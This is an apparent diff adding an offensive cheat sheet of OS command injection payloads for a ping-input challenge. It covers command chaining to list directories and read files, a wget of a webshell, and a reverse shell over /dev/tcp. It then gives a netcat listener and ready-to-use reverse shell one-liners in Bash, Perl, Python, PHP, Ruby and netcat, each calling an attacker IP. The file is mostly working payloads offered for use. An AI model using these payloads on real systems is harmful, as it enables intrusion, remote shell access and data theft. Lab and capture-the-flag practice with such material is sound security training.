@@ -1,0 +1,76 @@
+Low Manual OS Command Injection Payload Example
+@ Challenge : find some hidden data on this directory.
+
+@@ Ping me
+
+-- It pings the localhost (127.0.0.1) to check its reachability.
+127.0.0.1
+
+-- This command attempts to list the contents of the current directory (ls) after executing the ping command on 127.0.0.1. The && operator executes the second command only if the first command succeeds.
+127.0.0.1 && ls
+
+-- This command attempts to list the contents of the parent directory (..) regardless of the success or failure of the ping command on 127.0.0.1.
+127.0.0.1 ; ls ../
+
+-- This command tries to display the contents of a file named 'file' after executing the ping command on 127.0.0.1.
+127.0.0.1 ; cat file
+
+-- Similar to the previous command, this one displays the contents of a file named 'file' only if the ping command on 127.0.0.1 is successful.
+127.0.0.1 && cat file
+
+-- This command downloads a web shell (webshell.php) from a specified URL (http://targetip:8000/webshell.php) only if the ping command on 127.0.0.1 is successful.
+127.0.0.1 && wget http://targetip:8000/webshell.php
+
+-- This command executes a reverse shell payload after executing the ping command on 127.0.0.1. It establishes a reverse shell connection to the attacker's IP address (10.0.0.10) on port 1234.
+127.0.0.1 && exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'")
+
+-- This command spawns a pseudo-terminal (pty) shell after executing the ping command on 127.0.0.1, allowing the attacker to interact with a Bash shell.
+127.0.0.1 && python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+
+@@ Special Characters in Shell Commands
+
+Semicolon (;): This command pings 127.0.0.1 and then lists the contents of the current directory.
+ping 127.0.0.1 ; ls
+
+Ampersand (&): This pings 127.0.0.1 in the background and then immediately prints "Ping command started in the background".
+ping 127.0.0.1 & echo "Ping command started in the background"
+
+Logical OR (||):This attempts to ping 127.0.0.1, and if it fails, it prints "Ping failed".
+ping 127.0.0.1 || echo "Ping failed"
+
+Logical AND with background execution (&&): This pings 127.0.0.1, and if successful, it waits for 5 seconds before proceeding.
+ping 127.0.0.1 && sleep 5
+
+Parentheses (()):This groups the ping command and the sleep command together, executing them in a subshell.
+(ping 127.0.0.1; sleep 5)
+
+
+
+@@ Using netcat for reverse shell
+-- Start listener at port 1337
+nc -nvlp 1337
+
+
+
+@@ Reverse Shell Payload
+
+@Bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+@Perl
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+@Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+@PHP
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+@Ruby
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+@Netcat
+nc -e /bin/sh 10.0.0.1 1234
+
